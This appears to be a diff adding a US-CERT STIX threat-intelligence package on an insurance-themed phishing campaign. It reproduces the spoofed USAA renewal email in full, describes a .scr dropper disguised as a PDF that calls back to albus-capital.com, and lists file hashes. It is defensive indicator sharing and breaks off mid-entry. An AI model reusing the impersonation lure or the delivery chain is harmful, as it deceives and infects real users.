@@ -1,0 +1,475 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:EmailMessageObj="http://cybox.mitre.org/objects#EmailMessageObject-2" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:AddrObj="http://cybox.mitre.org/objects#AddressObject-2" xmlns:CISCP="http://us-cert.gov/ciscp" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-14-10279A" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd   http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd   http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd   http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd   http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd   http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd   http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd   http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd   http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd   http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd   http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd   http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd   http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd   http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd   http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd   http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd   http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd   http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd   http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd   http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd   http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Insurance Themed Phishing Email Delivers Malware - Update</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators - Phishing</stix:Package_Intent>
+    <stix:Description>This update was issued to indicate that the sender email mentioned was spoofed. The empty file indicator was also removed.
+
+On 23 May 2014, a phishing email was observed from the spoofed sender "USAA.Web.Services@customermail.usaa.com". This email contained a malicious attachment, "Auto_insurance_and_id_card.zip". When executed, the malware attempts to download a .zip archive from a remote resource via the domain "albus-capital.com".
+
+The malware analysis information in this report is derived from US-CERT MIFR 374345.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2014-06-19T16:09:50Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-f53be8de-0789-436a-8699-ee26479a5b1f" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-2d2fdcc3-796d-4def-bf2a-6c802f1a4ad8"/>
+        <indicator:Indicator idref="CISCP:indicator-3926796f-55ca-4881-a6a2-ae77f4e02493"/>
+        <indicator:Indicator idref="CISCP:indicator-ee9f6102-ccd9-4aef-bba3-2032a3aa9625"/>
+        <indicator:Indicator idref="CISCP:indicator-d931ed23-d23e-4c56-872d-4b50d075ffaf"/>
+        <indicator:Indicator idref="CISCP:indicator-dcf0c649-3963-4c6c-9379-ef1cca800c4b"/>
+        <indicator:Indicator idref="CISCP:indicator-b4d8b062-94d8-46ca-8529-6d221926eb9d"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-2d2fdcc3-796d-4def-bf2a-6c802f1a4ad8" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malicious E-mail</indicator:Type>
+      <indicator:Description>----- BEGIN EMAIL HEADERS -----
+From - Fri May 23 09:51:44 2014
+X-Account-Key: account5
+X-UIDL: 0005a5da51cc5aab
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+X-Mozilla-Keys:
+
+Return-Path: &lt;prvs=0441f3acbf=[REDACTED]&gt;
+
+
+X-Spam-Level: **
+X-Spam-Status: No, score=2.9 required=5.0 tests=HTML_MESSAGE,
+	RCVD_IN_BRBL_LASTEXT,RCVD_IN_RP_RNBL autolearn=disabled version=3.3.1
+Received: from ip-101.net-89-3-71.rev.numericable.fr
+(ip-101.net-89-3-71.rev.numericable.fr [89.3.71.101])
+	
+	Fri, 23 May 2014 09:48:37 -0400 (EDT)
+Received: from mtain-de08.r1000.mx.aol.com (mtain-de08.r1000.mx.aol.com
+[172.29.64.208])
+	by imd-mc05.r1000.mx.aol.com (Inbound Mail Deferral) with ESMTP id A4A4D70CC34AB
+	
+Received: [REDACTED] 
+	by mtain-de08.r1000.mx.aol.com (Internet Inbound) with ESMTP id
+0804838000082
+	
+Received: [REDACTED]
+	
+Received:[REDACTED]
+	
+Message-ID: &lt;99892579.4561042838500.JavaMail.zueddb1@prodedd1l&gt;
+Date: Fri, 23 May 2014 14:47:46 +0100 (CDT)
+From: [REDACTED]
+Reply-To: [REDACTED]
+To: 
+Subject: [REDACTED] Policy Renewal - Please Print Auto ID Cards
+X-Proofpoint-Direction: EDD
+X-Proofpoint-Virus-Version: vendor=fsecure
+engine=2.50.10432:5.6.7498,1.0.260,0.0.0000
+ definitions=2012-04-03_07:2012-04-04,2012-04-03,1970-01-01 signatures=0
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.24)
+Gecko/20100328 Thunderbird/2.0.0.24
+MIME-Version: 1.0
+To: 
+Content-Type: multipart/alternative;
+ boundary="------------01080800704090704030607"
+
+This is a multi-part message in MIME format.
+--------------01080800704090704030607
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 7bit
+
+To ensure delivery to your inbox, please add [REDACTED] to your address book.
+
+Auto Insurance and ID Cards
+View Accounts | Privacy Promise | Contact Us
+
+[REDACTED] SECURITY ZONE      [REDACTED] # ending in: 4657
+
+
+
+Dear Driver,Thank you for allowing [REDACTED] to serve you. Your auto policy will renew June 01, 2014 for your vehicle.Print your auto ID cards. We've also attached new auto insurance IDs cards  to this email: Open the PDF* attachment. Print your ID cards. Place them  in your vehicle today. Manage your policy on [REDACTED]. Remember, you can go to your Account Summary page anytime to:View and change your policy coverages and features.Add vehicle or drivers to your policy. View and print your policy documents, including ID cards. File a claim in less than five minutes. View or calculate your savings with multi-product savings.We value your business. Please think of [REDACTED] first for all your financial needs. Thank you,[REDACTED]. No matter the make, model or year of your vehicle, your opinion can help other [REDACTED] members make more informed car-buying decisions. Write a review of your vehicle now.
+
+
+Please do not reply to this e-mail.  To send a secure message to [REDACTED], please contact us. [REDACTED]
+
+[REDACTED] means [REDACTED] and its insurance, banking, investment and other companies. Banks Member FDIC. Investments provided by[REDACTED] Investment Management Company and [REDACTED], both registered broker dealers.*If you don't have Adobe Reader, you'll need to install it to view and print your ID cards.
+
+67827-0912
+
+
+--------------01080800704090704030607
+Content-Type: multipart/related;
+ boundary="------------01050600506060606030608"
+
+
+--------------01050600506060606030608
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt; &lt;html&gt;
+  &lt;head&gt;
+
+    &lt;meta hxxp-equiv="content-type" content="text/html; charset=UTF-8"&gt;
+  &lt;/head&gt;
+  &lt;body bgcolor="#ffffff" text="#000000"&gt; &lt;html&gt; &lt;div align="center"&gt; &lt;table bgcolor="#b5d7e6" border="0" cellpadding="0" cellspacing="0"
+width="650"&gt;
+ &lt;tbody&gt;&lt;tr&gt;
+&lt;td align="center" valign="middle" width="650" height="35"&gt;&lt;font
+style="color: #929292; font-size: 9px;" face="Verdana, sans-serif"&gt;To ensure delivery to your inbox, please add &lt;span style="color:#68A7C5"&gt;&lt;a href="[REDACTED]&lt;/a&gt;&lt;/span&gt;
+to your address book.&lt;/font&gt;&lt;/td&gt;&lt;td&gt;
+&lt;/td&gt;&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;table bgcolor="#b5d7e6" border="0" cellpadding="0" cellspacing="0"
+width="650"&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td width="10"&gt;&lt;/td&gt;
+&lt;td align="center" bgcolor="white" width="630"&gt; &lt;table border="0" cellpadding="0" cellspacing="0" width="604"&gt; &lt;tbody&gt;&lt;tr&gt; &lt;td colspan="4" height="5"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width="54" height="45"&gt;&lt;a target="_blank"
+href="hxxps://[REDACTED]/inet/ent_logon/Logon?EID=67827-0912_head"&gt;&lt;img src="hxxps://[REDACTED]/mcontent/static_assets/Media/email_logo.gif"
+alt="" border="0" width="61" height="41"&gt;&lt;/a&gt;&lt;/td&gt; &lt;td&gt; &lt;table border="0" cellpadding="0" cellspacing="0"&gt; &lt;tbody&gt;&lt;tr&gt; &lt;td style="font: bold 16px Arial, sans-serif; color: #6d6d6d;"
+align="left" height="22"&gt;&lt;span style="display: block; margin-top:
+9px;"&gt;Auto Insurance and ID Cards&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align="left" height="23" nowrap=""&gt;&lt;nobr&gt;&lt;font face="Verdana, sans-serif" size="1"&gt;&lt;a target="_blank"
+href="[REDACTED]/inet/ent_home/CpHome?EID=67827-0912_head"
+style="color: #6d6d6d; text-decoration: none;"&gt;View Accounts&lt;/a&gt; | &lt;a target="_blank"
+href="[REDACTED]/inet/ent_utils/McStaticPages?key=privacy_promise&amp;amp;EID=67827-0912_head"
+style="color: #6d6d6d; text-decoration: none;"&gt;Privacy Promise&lt;/a&gt; | &lt;a target="_blank"
+href="[REDACTED]/inet/ent_contactus/CpLevelZeroContactUs?ContactUsPageId=PublicContactUs&amp;EID=67827-0912_head"
+style="color: #6d6d6d; text-decoration: none;"&gt;Contact Us&lt;/a&gt;&lt;/font&gt;&lt;/nobr&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt; &lt;/td&gt; &lt;td align="right" valign="middle" width="367" height="45"&gt; &lt;table border="0" cellpadding="0" cellspacing="0" width="188"
+height="65"&gt; &lt;tbody&gt;&lt;tr&gt; &lt;td width="22"&gt;&lt;table border="0"
+cellpadding="0" cellspacing="0" width="22" height="65"&gt; &lt;tbody&gt;&lt;tr&gt; &lt;td style="line-height:0" valign="top" width="8" height="29"&gt;&lt;img src="[REDACTED]/mcontent/static_assets/Media/email_sec_1-1.gif"
+alt="" style="display:block" border="0" width="8" height="29"&gt;&lt;/td&gt; &lt;td style="line-height:0" bgcolor="#e7e7e8" valign="top" width="14"
+height="29"&gt;&lt;img
+src="[REDACTED]/mcontent/static_assets/Media/email_sec_1-2.gif"
+alt="" style="display:block" border="0" width="14" height="29"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td style="line-height:0" valign="top" width="8"
+height="29"&gt;&lt;img
+src="[REDACTED]/mcontent/static_assets/Media/email_sec_spacer.gif"
+alt="" style="display:block" border="0" width="8" height="29"&gt;&lt;/td&gt; &lt;td style="line-height:0" bgcolor="#e7e7e8" valign="top" width="14"
+height="29"&gt;&lt;img
+src="[REDACTED]/mcontent/static_assets/Media/email_sec_spacer.gif"
+alt="" style="display:block" border="0" width="14" height="29"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td style="line-height:0" valign="bottom" width="8"
+height="7"&gt;&lt;/td&gt; &lt;td style="line-height:0" bgcolor="#e7e7e8"
+valign="bottom" width="14" height="7"&gt;&lt;img src="[REDACTED]/mcontent/static_assets/Media/email_sec_2-1.gif"
+alt="" style="display:block" border="0" width="14" height="7"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;/td&gt; &lt;td align="left" bgcolor="#e7e7e8"&gt;&lt;table border="0" cellpadding="5" cellspacing="0" width="100%" height="65"&gt; &lt;tbody&gt;&lt;tr&gt; &lt;td style="text-align:left; font-size:9px; line-height:12px;
+-webkit-text-size-adjust: none;" align="left" valign="middle"&gt;&lt;font style="font-size:10px; color:#00365b" face="Arial, Helvetica, sans-serif"&gt;&lt;strong&gt;[REDACTED] SECURITY ZONE&lt;/strong&gt;&lt;/font&gt; &lt;br&gt; &lt;font style="font-size:9px; color:#00365b" face="Arial, Helvetica, sans-serif"&gt;&lt;/font&gt; &lt;br&gt; &lt;font style="font-size:9px; color:#00365b"
+face="Arial, Helvetica, sans-serif"&gt;&lt;/font&gt; &lt;br&gt; &lt;font style="font-size:9px; color:#00365b" face="Arial, Helvetica, sans-serif"&gt;[REDACTED] # ending in: 4657&lt;/font&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;/td&gt; &lt;td bgcolor="#ffffff" width="7"&gt;&lt;table border="0"
+cellpadding="0" cellspacing="0" width="7" height="65"&gt; &lt;tbody&gt;&lt;tr&gt; &lt;td style="line-height:0" align="right" bgcolor="#e7e7e8" valign="top"
+width="7" height="7"&gt;&lt;img
+src="[REDACTED]/mcontent/static_assets/Media/email_sec_1-3.gif"
+alt="" style="display:block" border="0" width="7" height="7"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td style="line-height:0" align="right" bgcolor="#e7e7e8"
+valign="top" width="7" height="51"&gt;&lt;img
+src="[REDACTED]/mcontent/static_assets/Media/email_sec_spacer.gif"
+alt="" style="display:block" border="0" width="7" height="51"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td style="line-height:0" align="right" bgcolor="#e7e7e8"
+valign="bottom" width="7" height="7"&gt;&lt;img src="[REDACTED]/mcontent/static_assets/Media/email_sec_2-2.gif"
+alt="" style="display:block" border="0" width="7" height="7"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt;&lt;/td&gt;
+
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td colspan="4" height="20"&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td colspan="4"&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;table border="0" cellpadding="0" cellspacing="0" width="95%"&gt;
+
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td align="left" width="95%"&gt;
+&lt;font style="color: #333333; font-size: 12px; line-height: 18px;"
+face="Verdana, sans-serif"&gt;
+&lt;p style="margin-bottom:1em"&gt;Dear Driver,&lt;/p&gt;
+
+&lt;p style="margin-bottom:1em"&gt;Thank you for allowing [REDACTED] to serve you.
+Your auto policy will renew June 01, 2014 for your vehicle.&lt;/p&gt;
+
+&lt;p style="margin-bottom:1em"&gt;&lt;strong&gt;Print your auto ID cards&lt;/strong&gt;&lt;br&gt;
+
+We've also attached new auto insurance IDs cards  to this email:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Open the PDF* attachment.&lt;/li&gt;
+&lt;li&gt;Print your ID cards.&lt;/li&gt;
+&lt;li&gt;Place them  in your vehicle today.&lt;/li&gt;&lt;/ol&gt;
+
+&lt;p style="margin-bottom:1em"&gt;&lt;strong&gt;Manage your policy on [REDACTED]&lt;/strong&gt;&lt;br&gt;
+
+Remember, you can go to your &lt;a target="_blank"
+href="[REDACTED]/inet/gas_pc_pas/GyMemberAutoHistoryServlet?EID=67827-0912_body"&gt;Account
+Summary&lt;/a&gt; page anytime to:
+
+&lt;/p&gt;&lt;ul&gt;&lt;li&gt;View and change your policy coverages and features.&lt;/li&gt; &lt;li&gt;Add vehicle or drivers to your policy.&lt;/li&gt; &lt;li&gt;View and print your policy documents, including ID cards.&lt;/li&gt; &lt;li&gt;File a claim in less than five minutes.&lt;/li&gt; &lt;li&gt;View or calculate your savings with multi-product savings.&lt;/li&gt;&lt;/ul&gt;
+
+
+&lt;p style="margin-bottom:1em"&gt;We value your business. Please think of [REDACTED] first for all your financial needs.&lt;/p&gt;
+
+&lt;p style="margin-bottom:1em"&gt;Thank you,&lt;br&gt; [REDACTED] &lt;/p&gt;
+
+
+&lt;p style="margin-bottom:1em"&gt;P.S. No matter the make, model or year of your vehicle, your opinion can help other [REDACTED] members make more informed car-buying decisions. &lt;a target="_blank"
+href="[REDACTED]"&gt;Write
+a review of your vehicle now&lt;/a&gt;.&lt;/p&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td colspan="2" align="left" height="30"&gt;&lt;br&gt; &lt;a target="_blank"
+href="hxxp://www.facebook.com/USAA?EID=67827-0912_body"&gt;&lt;img
+src="[REDACTED]"
+alt="Facebook" border="0" width="32" height="32"&gt;&lt;/a&gt;&lt;a target="_blank"
+href="hxxp://twitter.com/usaa?EID=67827-0912_body"&gt;&lt;img
+src="[REDACTED]"
+alt="Twitter" border="0" width="32"
+height="32"&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/td&gt;
+&lt;td width="5"&gt;&lt;/td&gt;
+&lt;td width="5"&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td width="10" height="5"&gt;&lt;/td&gt;
+&lt;td width="630" height="5"&gt;&lt;/td&gt;
+&lt;td width="5" height="5"&gt;&lt;/td&gt;
+&lt;td width="5" height="5"&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td colspan="4" height="20"&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td colspan="4" align="center"&gt;
+&lt;font style="color: #6d6d6d; font-size: 10px; line-height: 18px;"
+face="Verdana, sans-serif"&gt;
+Please do not reply to this e-mail.  To send a secure message to [REDACTED], please &lt;a target="_blank"
+href="[REDACTED]/inet/ent_references/CpSendUsAMessage?ContentArea=cp&amp;EID=67827-0912_foot"
+style="color: #408cb0; text-decoration: none;"&gt;contact us&lt;/a&gt;.&lt;br&gt; &lt;br&gt; &lt;a target="_blank"
+href="[REDACTED]/inet/ent_utils/McStaticPages?key=privacy_promise&amp;EID=67827-0912_foot"
+style="color: #6d6d6d"&gt;Privacy Promise&lt;/a&gt;&lt;br&gt; &lt;br&gt;
+
+[REDACTED], 9800 Fredericksburg Road, San Antonio, Texas 78288&lt;br&gt; &lt;/font&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width="10" height="15"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan="1" align="left" width="5"&gt;&lt;/td&gt; &lt;td colspan="2" align="left" width="630"&gt; &lt;font style="color: #6d6d6d; font-size: 10px; line-height: 18px;"
+face="Verdana, sans-serif"&gt;
+[REDACTED] means [REDACTED] and &lt;a target="_blank"
+href="[REDACTED]/inet/ent_utils/McStaticPages?key=about_usaa_overview&amp;EID=67827-0912_foot"
+style="color: #408cb0; text-decoration: none;"&gt;its insurance, banking, investment and other companies&lt;/a&gt;. Banks Member FDIC. Investments provided by [REDACTED] Investment Management Company and [REDACTED] Financial Advisors Inc., both registered broker dealers.&lt;br&gt; &lt;br&gt;
+
+
+*If you don't have &lt;a target="_blank"
+href="hxxp://www.adobe.com/prodindex/acrobat/readstep.html"
+style="color: #408cb0; text-decoration: none;"&gt;Adobe Reader&lt;/a&gt;, you'll need to install it to view and print your ID cards.
+
+&lt;/font&gt;
+&lt;/td&gt;
+&lt;td colspan="1" align="left" width="5"&gt;&lt;/td&gt;
+
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td width="10" height="15"&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;&lt;td colspan="4" align="right"&gt;
+&lt;font style="color: #6d6d6d; font-size: 10px; line-height: 18px;"
+face="Verdana, sans-serif"&gt;&lt;/font&gt;&lt;font style="color: #6d6d6d;
+font-size: 10px; line-height: 18px;" face="Verdana, sans-serif"&gt;67827-0912&lt;/font&gt;&lt;br&gt; &lt;br&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;/div&gt; &lt;/html&gt;
+  &lt;/body&gt;
+
+&lt;/html&gt;
+-----  END EMAIL HEADERS  -----</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-12c3e68e-b26f-4ca3-9de9-672ce31f5b3d">
+        <cybox:Object id="CISCP:Object-8ca541df-9d7b-46b9-b5b0-483057731658">
+          <cybox:Properties xsi:type="EmailMessageObj:EmailMessageObjectType">
+            <EmailMessageObj:Header>
+              <EmailMessageObj:From category="e-mail">
+                <cyboxCommon:Custom_Properties>
+                  <cyboxCommon:Property name="is_spoofed">true</cyboxCommon:Property>
+                </cyboxCommon:Custom_Properties>
+                <AddrObj:Address_Value condition="Equals">USAA.Web.Services@customermail.usaa.com</AddrObj:Address_Value>
+              </EmailMessageObj:From>
+              <EmailMessageObj:Subject condition="Equals">USAA Policy Renewal - Please Print Auto ID Cards</EmailMessageObj:Subject>
+              <EmailMessageObj:Message_ID condition="Equals">99892579.4561042838500.JavaMail.zueddb1@prodedd1l</EmailMessageObj:Message_ID>
+              <EmailMessageObj:Sender category="e-mail">
+                <cyboxCommon:Custom_Properties>
+                  <cyboxCommon:Property name="is_spoofed">true</cyboxCommon:Property>
+                </cyboxCommon:Custom_Properties>
+                <AddrObj:Address_Value condition="Equals">USAA.Web.Services@customermail.usaa.com</AddrObj:Address_Value>
+              </EmailMessageObj:Sender>
+            </EmailMessageObj:Header>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-05-23T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-3926796f-55ca-4881-a6a2-ae77f4e02493" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>The contents of the .zip file attached to the email imitate a .pdf file. It uses an Adobe PDF icon and a .scr file name extension
+
+Once executed copies and renames itself to "%TEMP%\updGA.exe" It executes "updGA.exe" and exits.
+
+Registry Hkcu\Software\Microsoft\Windows\Shellnoroam\Muicache
+Value:
+
+&lt;Path of execution&gt;\Auto_insurance_and_id_card.scr
+Data:
+Auto_insurance_and_id_card.scr</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-95946041-588c-48b1-a0bb-62e67199e6f3">
+        <cybox:Object id="CISCP:Object-5f24bc5b-e640-4da5-9a2e-dbbc1dd1c99a">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Auto_insurance_and_id_card.scr</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">28672</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">95a8fd7a625d3d69f2e728fc3416b979</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">96ed65c1d24a670bfe5d92500f22c8c5a3c43bd0</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:ddyTStdZrow/VlZbn+RHM13vfdHldhwLGEGC+OGa02:dYGtdtFR6M13vfdHldhwyEr+OGa02</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-05-23T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-ee9f6102-ccd9-4aef-bba3-2032a3aa9625" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This is a copy of "Auto_insurance_and_id_card.scr" with the execution path of "Auto_insurance_and_id_card.scr" appended to the end of this file. It executes from "%TEMP%\updGA.exe" and sets the registry value that are noted below:
+
+Hkcu\Software\Microsoft\Windows\Shellnoroam\Muicache
+Name:
+%Temp%\updGA.exe
+Data:
+updGA
+
+This file then performs registry modifications such as:
+This file calls back to the domain albus-capital.com with a GET request for
+"/images/howto/777_2305USmp_1.zip".</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-c389b05f-9368-46d7-95de-e4402d2d0cef">
+        <cybox:Object id="CISCP:Object-ad04a94e-602e-4127-ae82-bc0f28157195">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">updGA.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">28910</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">3a0b5841b6b9d3a235432d21e4ddb69f</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">a261da83f4c30c0c6296547c1e31e3994ed989d6</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
